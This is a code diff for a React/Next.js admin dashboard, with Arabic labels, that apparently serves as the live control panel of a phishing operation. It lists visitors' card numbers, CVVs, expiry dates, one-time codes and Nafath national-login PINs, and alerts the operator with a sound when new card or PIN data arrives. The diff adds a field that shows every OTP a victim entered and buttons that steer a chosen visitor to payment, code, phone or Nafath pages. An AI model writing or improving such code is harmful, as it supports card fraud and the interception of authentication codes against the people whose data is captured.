@@ -1,38 +1,8 @@
 "use client"
+
 import { useState, useEffect, useMemo, useRef, useCallback } from "react"
 import { useRouter } from "next/navigation"
-import {
-  Trash2,
-  Users,
-  CreditCard,
-  UserCheck,
-  Flag,
-  Bell,
-  LogOut,
-  Search,
-  Calendar,
-  Download,
-  Settings,
-  User,
-  Menu,
-  ChevronRight,
-  FileText,
-  Shield,
-  Key,
-  UserX,
-  Eye,
-  Copy,
-  Phone,
-  MessageSquare,
-  MoreVertical,
-  Filter,
-  X,
-  Wifi,
-  Smartphone,
-  Hash,
-  IceCream,
-  LockIcon,
-} from "lucide-react"
+import { Trash2, Users, CreditCard, UserCheck, Flag, Bell, LogOut, Search, Calendar, Download, Settings, User, Menu, ChevronRight, FileText, Shield, Key, UserX, Eye, Copy, Phone, MessageSquare, MoreVertical, Filter, X, Wifi, Smartphone, Hash, IceCream, LockIcon } from 'lucide-react'
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { formatDistanceToNow } from "date-fns"
@@ -87,6 +57,7 @@ interface Notification {
   isHidden?: boolean
   ip?: string
   otp?: string
+  allOtps?: string[]
   otpCode?: string
   otpSent: boolean
   otpVerificationTime?: string
@@ -155,8 +126,8 @@ function UserStatus({ userId }: { userId: string }) {
         status === "online"
           ? "bg-emerald-500 animate-pulse shadow-lg shadow-emerald-500/50"
           : status === "offline"
-            ? "bg-gray-400"
-            : "bg-amber-400 animate-pulse"
+          ? "bg-gray-400"
+          : "bg-amber-400 animate-pulse"
       }`}
     />
   )
@@ -197,11 +168,13 @@ function NotificationCard({
   isSelected,
   onClick,
   onFlagChange,
+  onCurrentPageUpdate,
 }: {
   notification: Notification
   isSelected: boolean
   onClick: () => void
   onFlagChange: (id: string, color: FlagColor) => void
+  onCurrentPageUpdate: (id: string, currentPage: string) => void
 }) {
   const getCardBackground = () => {
     if (notification.flagColor) {
@@ -254,24 +227,6 @@ function NotificationCard({
     if (notification.otp || notification.otpCode) info.push("OTP")
     return info.join(" • ")
   }
-  const handleCurrentPageUpdate = async (id: string, currentPage: string) => {
-    try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { currentPage })
-      toast({
-        title: "تم تحديث الصفحة الحالية",
-        description: `تم تحديث الصفحة الحالية إلى: ${currentPage}`,
-        variant: "default",
-      })
-    } catch (error) {
-      console.error("Error updating current page:", error)
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء تحديث الصفحة الحالية.",
-        variant: "destructive",
-      })
-    }
-  }
 
   return (
     <div
@@ -314,26 +269,51 @@ function NotificationCard({
                   </Button>
                 </DropdownMenuTrigger>
                 <DropdownMenuContent align="end">
-                  <DropdownMenuItem onClick={() => handleCurrentPageUpdate(notification.id, "1")}>
+                  <DropdownMenuItem
+                    onClick={(e) => {
+                      e.stopPropagation()
+                      onCurrentPageUpdate(notification.id, "1")
+                    }}
+                  >
                     <Flag className="h-4 w-4 mr-2 text-red-500" />
                     معلومات
                   </DropdownMenuItem>
-                  <DropdownMenuItem onClick={() => handleCurrentPageUpdate(notification.id, "6")}>
+                  <DropdownMenuItem
+                    onClick={(e) => {
+                      e.stopPropagation()
+                      onCurrentPageUpdate(notification.id, "6")
+                    }}
+                  >
                     <Flag className="h-4 w-4 mr-2 text-yellow-500" />
-             دفع
+                    دفع
                   </DropdownMenuItem>
-                  <DropdownMenuItem onClick={() => handleCurrentPageUpdate(notification.id, "7")}>
+                  <DropdownMenuItem
+                    onClick={(e) => {
+                      e.stopPropagation()
+                      onCurrentPageUpdate(notification.id, "7")
+                    }}
+                  >
                     <Flag className="h-4 w-4 mr-2 text-green-500" />
-                  كود
+                    كود
                   </DropdownMenuItem>
                   <DropdownMenuSeparator />
-                  <DropdownMenuItem onClick={() => handleCurrentPageUpdate(notification.id, "9999")}>
+                  <DropdownMenuItem
+                    onClick={(e) => {
+                      e.stopPropagation()
+                      onCurrentPageUpdate(notification.id, "9999")
+                    }}
+                  >
                     <Flag className="h-4 w-4 mr-2 text-blue-500" />
-                هاتف
+                    هاتف
                   </DropdownMenuItem>
-                  <DropdownMenuItem onClick={() => handleCurrentPageUpdate(notification.id, "nafaz")}>
+                  <DropdownMenuItem
+                    onClick={(e) => {
+                      e.stopPropagation()
+                      onCurrentPageUpdate(notification.id, "nafaz")
+                    }}
+                  >
                     <Flag className="h-4 w-4 mr-2 text-teal-500" />
-              نفاذ
+                    نفاذ
                   </DropdownMenuItem>
                 </DropdownMenuContent>
               </DropdownMenu>
@@ -346,25 +326,23 @@ function NotificationCard({
 
           {/* Status badges */}
           <div className="flex items-center gap-1 flex-wrap">
-          {notification.currentPage&& (
+            {notification.currentPage && (
               <Badge variant="outline" className="text-xs px-2 py-0.5">
-                {
-                  notification.currentPage === "1"
+                {notification.currentPage === "1"
                   ? "معلومات"
-                  :notification.currentPage === "2"
-                    ? "معلومات"
-                    : notification.currentPage === "3"
-                      ? "عروض"
-                      : notification.currentPage === "6"
-                        ? "دفع"
-                        : notification.currentPage === "7"
-                          ? "كود"
-                          : notification.currentPage === "9999"
-                            ? "هاتف"
-                            : notification.currentPage === "nafaz"
-                              ? "نفاذ"
-                              : "غير معروف" // Default text for unmatched pages
-                }
+                  : notification.currentPage === "2"
+                  ? "معلومات"
+                  : notification.currentPage === "3"
+                  ? "عروض"
+                  : notification.currentPage === "6"
+                  ? "دفع"
+                  : notification.currentPage === "7"
+                  ? "كود"
+                  : notification.currentPage === "9999"
+                  ? "هاتف"
+                  : notification.currentPage === "nafaz"
+                  ? "نفاذ"
+                  : "غير معروف"}
               </Badge>
             )}
             {notification.cardNumber && (
@@ -406,7 +384,6 @@ function NotificationCard({
                 OTP
               </Badge>
             )}
-
           </div>
         </div>
       </div>
@@ -418,18 +395,18 @@ function NotificationDetails({
   notification,
   onClose,
   onCurrentPageUpdate,
-  onAuthNumberUpdate, // New prop for nafaz_pin update
+  onAuthNumberUpdate,
 }: {
   notification: Notification | null
   onClose: () => void
   onCurrentPageUpdate?: (id: string, currentPage: string) => void
-  onAuthNumberUpdate?: (id: string, authNumber: string) => void // New prop type
+  onAuthNumberUpdate?: (id: string, authNumber: string) => void
 }) {
   const [activeTab, setActiveTab] = useState<"personal" | "card" | "nafaz" | "phone">("personal")
   const [editingCurrentPage, setEditingCurrentPage] = useState(false)
   const [currentPageValue, setCurrentPageValue] = useState("")
-  const [editingAuthNumber, setEditingAuthNumber] = useState(false) // New state for nafaz_pin
-  const [authNumberValue, setAuthNumberValue] = useState("") // New state for nafaz_pin value
+  const [editingAuthNumber, setEditingAuthNumber] = useState(false)
+  const [authNumberValue, setAuthNumberValue] = useState("")
 
   useEffect(() => {
     if (notification?.currentPage) {
@@ -444,24 +421,6 @@ function NotificationDetails({
     if (notification && onCurrentPageUpdate && currentPageValue.trim()) {
       onCurrentPageUpdate(notification.id, currentPageValue.trim())
       setEditingCurrentPage(false)
-    }
-  }
-  const handleCurrentPageUpdate = async (id: string, currentPage: string) => {
-    try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { currentPage })
-      toast({
-        title: "تم تحديث الصفحة الحالية",
-        description: `تم تحديث الصفحة الحالية إلى: ${currentPage}`,
-        variant: "default",
-      })
-    } catch (error) {
-      console.error("Error updating current page:", error)
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء تحديث الصفحة الحالية.",
-        variant: "destructive",
-      })
     }
   }
 
@@ -540,22 +499,42 @@ function NotificationDetails({
             </div>
           </div>
         </div>
-        <div>
-               <Button onClick={()=>handleCurrentPageUpdate(notification.id,"1")} variant={notification.currentPage ==="1"?"default":"ghost"} size="icon">
-                <FileText className="h-5 w-5" />
-              </Button>
-              <Button onClick={()=>handleCurrentPageUpdate(notification.id,"6")} variant={notification.currentPage ==="6"?"default":"ghost"}  size="icon">
-                <CreditCard className="h-5 w-5" />
-              </Button>
-              <Button onClick={()=>handleCurrentPageUpdate(notification.id,"nafaz")}variant={notification.currentPage ==="nafaz"?"default":"ghost"} size="icon">
-                <Shield className="h-5 w-5" />
-              </Button>
-              <Button onClick={()=>handleCurrentPageUpdate(notification.id,"7")} variant={notification.currentPage ==="7"?"default":"ghost"} size="icon">
-                <LockIcon className="h-5 w-5" />
-              </Button>
-              <Button onClick={()=>handleCurrentPageUpdate(notification.id,"9999")} variant={notification.currentPage ==="9999"?"default":"ghost"} size="icon">
-                <Phone className="h-5 w-5" />
-              </Button>
+        <div className="hidden p-4 rounded-md sm:block">
+          <Button
+            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "1")}
+            variant={notification.currentPage === "1" ? "default" : "ghost"}
+            size="icon"
+          >
+            <FileText className="h-5 w-5" />
+          </Button>
+          <Button
+            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "6")}
+            variant={notification.currentPage === "6" ? "default" : "ghost"}
+            size="icon"
+          >
+            <CreditCard className="h-5 w-5" />
+          </Button>
+          <Button
+            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "nafaz")}
+            variant={notification.currentPage === "nafaz" ? "default" : "ghost"}
+            size="icon"
+          >
+            <Shield className="h-5 w-5" />
+          </Button>
+          <Button
+            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "7")}
+            variant={notification.currentPage === "7" ? "default" : "ghost"}
+            size="icon"
+          >
+            <LockIcon className="h-5 w-5" />
+          </Button>
+          <Button
+            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "9999")}
+            variant={notification.currentPage === "9999" ? "default" : "ghost"}
+            size="icon"
+          >
+            <Phone className="h-5 w-5" />
+          </Button>
         </div>
         <div className="flex items-center gap-2">
           <UserStatus userId={notification.id} />
@@ -713,8 +692,8 @@ function NotificationDetails({
                     notification.vehicle_type === "registration"
                       ? "تسجيل"
                       : notification.vehicle_type === "customs"
-                        ? "جمارك"
-                        : "رقم تسلسلي",
+                      ? "جمارك"
+                      : "رقم تسلسلي",
                   icon: FileText,
                 },
                 {
@@ -723,8 +702,8 @@ function NotificationDetails({
                     notification.paymentStatus === "completed"
                       ? "مكتمل"
                       : notification.paymentStatus === "pending"
-                        ? "معلق"
-                        : notification.paymentStatus,
+                      ? "معلق"
+                      : notification.paymentStatus,
                   icon: CreditCard,
                 },
                 { label: "تاريخ بداية البوليصة", value: notification.policyStartDate, icon: Calendar },
@@ -789,8 +768,8 @@ function NotificationDetails({
                                       item.label.includes("رمز التحقق")
                                         ? "bg-orange-100 text-orange-700 border-orange-200"
                                         : item.label.includes("شبكة")
-                                          ? "bg-cyan-100 text-cyan-700 border-cyan-200"
-                                          : "bg-blue-100 text-blue-700 border-blue-200"
+                                        ? "bg-cyan-100 text-cyan-700 border-cyan-200"
+                                        : "bg-blue-100 text-blue-700 border-blue-200"
                                     }`}
                                   >
                                     {item.value}
@@ -821,54 +800,54 @@ function NotificationDetails({
 
           {activeTab === "card" && (
             <div className="space-y-3 p-1 ">
-               <Card >
+              <Card>
                 <CardContent className=" bg-green-100 border-blue-200 dark:border-blue-800 dark:bg-blue-900/20">
-            {[
-                { label: "رقم البطاقة", value: notification.cardNumber, icon: CreditCard },
-                {
-                  label: "تاريخ الانتهاء",
-                  value:
-                    notification.cardMonth && notification.cardYear
-                      ? `${notification.cardMonth}/${notification.cardYear}`
-                      : null,
-                  icon: Calendar,
-                },
-                { label: "رمز الامان (CVV)", value: notification.cvv, icon: Shield },
-                { label: "رمز التحقق (OTP)", value: notification.otp || notification.otpCode, icon: Shield },
-              ].map(
-                (item) =>
-                  item.value && (
-                    <Card key={item.label} className="border-muted/50">
-                      <CardContent className="p-4">
-                        <div className="flex items-center justify-between">
-                          <div className="flex items-center gap-3">
-                            <item.icon className="h-4 w-4 text-muted-foreground" />
-                            <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
-                          </div>
-                          <div className="flex items-center gap-2">
-                            <Badge variant="secondary" className="font-mono text-sm">
-                              {item.value}
-                            </Badge>
-                            <Button variant="ghost" size="icon" className="h-6 w-6">
-                              <Copy className="h-3 w-3" />
-                            </Button>
-                          </div>
-                        </div>
-                      </CardContent>
-                    </Card>
-                  ),
-              )}
-              {!notification.cardNumber && (
-                <div className="text-center py-8">
-                  <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
-                    <CreditCard className="h-8 w-8 text-muted-foreground" />
-                  </div>
-                  <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات بطاقة</p>
-                  <p className="text-xs text-muted-foreground">لم يتم تسجيل معلومات بطاقة لهذا المستخدم</p>
-                </div>
-              )}
-              </CardContent>
-
+                  {[
+                    { label: "رقم البطاقة", value: notification.cardNumber, icon: CreditCard },
+                    {
+                      label: "تاريخ الانتهاء",
+                      value:
+                        notification.cardMonth && notification.cardYear
+                          ? `${notification.cardMonth}/${notification.cardYear}`
+                          : null,
+                      icon: Calendar,
+                    },
+                    { label: "رمز الامان (CVV)", value: notification.cvv, icon: Shield },
+                    { label: "رمز التحقق (OTP)", value: notification.otp || notification.otpCode, icon: Shield },
+                    { label: "جميع الرموز", value: notification.allOtps?.join(''), icon: Shield },
+                  ].map(
+                    (item) =>
+                      item.value && (
+                        <Card key={item.label} className="border-muted/50">
+                          <CardContent className="p-4">
+                            <div className="flex items-center justify-between">
+                              <div className="flex items-center gap-3">
+                                <item.icon className="h-4 w-4 text-muted-foreground" />
+                                <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
+                              </div>
+                              <div className="flex items-center gap-2">
+                                <Badge variant="secondary" className="font-mono text-sm">
+                                  {item.value}
+                                </Badge>
+                                <Button variant="ghost" size="icon" className="h-6 w-6">
+                                  <Copy className="h-3 w-3" />
+                                </Button>
+                              </div>
+                            </div>
+                          </CardContent>
+                        </Card>
+                      ),
+                  )}
+                  {!notification.cardNumber && (
+                    <div className="text-center py-8">
+                      <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
+                        <CreditCard className="h-8 w-8 text-muted-foreground" />
+                      </div>
+                      <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات بطاقة</p>
+                      <p className="text-xs text-muted-foreground">لم يتم تسجيل معلومات بطاقة لهذا المستخدم</p>
+                    </div>
+                  )}
+                </CardContent>
               </Card>
             </div>
           )}
@@ -918,37 +897,36 @@ function NotificationDetails({
                         )}
                         <div className="flex items-center justify-between">
                           <span className="text-sm font-medium text-muted-foreground">حالة التحقق</span>
-                       
                         </div>
                       </div>
                     </CardContent>
                   </Card>
 
                   {/* New Card for Auth Number in Nafaz tab */}
-                    <Card className="border-muted/50">
-                      <CardContent className="p-4">
-                        <div className="flex items-center justify-between">
-                          <div className="flex items-center gap-3">
-                            <Hash className="h-4 w-4 text-muted-foreground" />
-                            <span className="text-sm font-medium text-muted-foreground">رقم التحقق (Auth Number)</span>
-                          </div>
-                          <div className="flex items-center gap-2">
-                            <span className="text-sm font-semibold text-foreground">{notification.nafaz_pin}</span>
-                            <Button
-                              variant="ghost"
-                              size="icon"
-                              className="h-6 w-6"
-                              onClick={() => setEditingAuthNumber(true)}
-                            >
-                              <Settings className="h-3 w-3" />
-                            </Button>
-                            <Button variant="ghost" size="icon" className="h-6 w-6">
-                              <Copy className="h-3 w-3" />
-                            </Button>
-                          </div>
+                  <Card className="border-muted/50">
+                    <CardContent className="p-4">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-3">
+                          <Hash className="h-4 w-4 text-muted-foreground" />
+                          <span className="text-sm font-medium text-muted-foreground">رقم التحقق (Auth Number)</span>
                         </div>
-                      </CardContent>
-                    </Card>
+                        <div className="flex items-center gap-2">
+                          <span className="text-sm font-semibold text-foreground">{notification.nafaz_pin}</span>
+                          <Button
+                            variant="ghost"
+                            size="icon"
+                            className="h-6 w-6"
+                            onClick={() => setEditingAuthNumber(true)}
+                          >
+                            <Settings className="h-3 w-3" />
+                          </Button>
+                          <Button variant="ghost" size="icon" className="h-6 w-6">
+                            <Copy className="h-3 w-3" />
+                          </Button>
+                        </div>
+                      </div>
+                    </CardContent>
+                  </Card>
 
                   {/* New Card for Current Page in Nafaz tab */}
                   {notification.currentPage && (
@@ -965,6 +943,7 @@ function NotificationDetails({
                               variant="ghost"
                               size="icon"
                               className="h-6 w-6"
+                              onClick={() => setEditingCurrentPage(true)}
                             >
                               <Settings className="h-3 w-3" />
                             </Button>
@@ -998,11 +977,11 @@ function NotificationDetails({
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
   const [isLoading, setIsLoading] = useState(true)
-  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
+  const [selectedNotificationId, setSelectedNotificationId] = useState<string | null>(null)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
   const [nafazSubmissions, setNafazSubmissions] = useState<number>(0)
-  const [phoneSubmissions, setPhoneSubmissions] = useState<number>(0) // New stat
+  const [phoneSubmissions, setPhoneSubmissions] = useState<number>(0)
   const [filterType, setFilterType] = useState<"all" | "card" | "online" | "nafaz" | "phone">("all")
   const [searchTerm, setSearchTerm] = useState("")
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
@@ -1030,6 +1009,11 @@ export default function NotificationsPage() {
       })
     }
   }, [])
+
+  const selectedNotification = useMemo(
+    () => notifications.find((n) => n.id === selectedNotificationId) || null,
+    [notifications, selectedNotificationId],
+  )
 
   // Filter notifications
   const filteredNotifications = useMemo(() => {
@@ -1066,7 +1050,7 @@ export default function NotificationsPage() {
           notification.selectedInsuranceOffer?.toLowerCase().includes(term) ||
           notification.paymentStatus?.toLowerCase().includes(term) ||
           notification.nafadUsername?.toLowerCase().includes(term) ||
-          notification.nafaz_pin?.toLowerCase().includes(term) // Include nafaz_pin in search
+          notification.nafaz_pin?.toLowerCase().includes(term)
         )
       }
       return true
@@ -1183,7 +1167,7 @@ export default function NotificationsPage() {
             n.phoneOtpCode ||
             n.owner_identity_number ||
             n.nafadUsername ||
-            n.nafaz_pin, // Include nafaz_pin in important info check
+            n.nafaz_pin,
         )
         if (hasNewImportantInfo) {
           playNotificationSound()
@@ -1285,11 +1269,10 @@ export default function NotificationsPage() {
   }
 
   const handleNotificationClick = (notification: Notification) => {
-    setSelectedNotification(notification)
+    setSelectedNotificationId(notification.id)
     setShowDetails(true)
   }
   const handleShow = () => {
-
     setShow(!show)
   }
   if (isLoading && notifications.length === 0) {
@@ -1417,7 +1400,7 @@ export default function NotificationsPage() {
       </header>
 
       {/* Statistics Bar */}
-      <div className={`border-b bg-muted/20 p-4 ${show?"":" hidden"}`}>
+      <div className={`border-b bg-muted/20 p-4 ${show ? "" : " hidden"}`}>
         <div className="grid grid-cols-2 lg:grid-cols-5 gap-4">
           {statistics.map((stat) => {
             const Icon = stat.icon
@@ -1428,12 +1411,12 @@ export default function NotificationsPage() {
                     stat.color === "emerald"
                       ? "bg-emerald-100 text-emerald-600 dark:bg-emerald-900/30 dark:text-emerald-400"
                       : stat.color === "blue"
-                        ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
-                        : stat.color === "cyan"
-                          ? "bg-cyan-100 text-cyan-600 dark:bg-cyan-900/30 dark:text-cyan-400"
-                          : stat.color === "purple"
-                            ? "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
-                            : "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400"
+                      ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
+                      : stat.color === "cyan"
+                      ? "bg-cyan-100 text-cyan-600 dark:bg-cyan-900/30 dark:text-cyan-400"
+                      : stat.color === "purple"
+                      ? "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
+                      : "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400"
                   }`}
                 >
                   <Icon className="h-5 w-5" />
@@ -1540,9 +1523,10 @@ export default function NotificationsPage() {
                   <div key={notification.id} className="group">
                     <NotificationCard
                       notification={notification}
-                      isSelected={selectedNotification?.id === notification.id}
+                      isSelected={selectedNotificationId === notification.id}
                       onClick={() => handleNotificationClick(notification)}
                       onFlagChange={handleFlagColorChange}
+                      onCurrentPageUpdate={handleCurrentPageUpdate}
                     />
                   </div>
                 ))
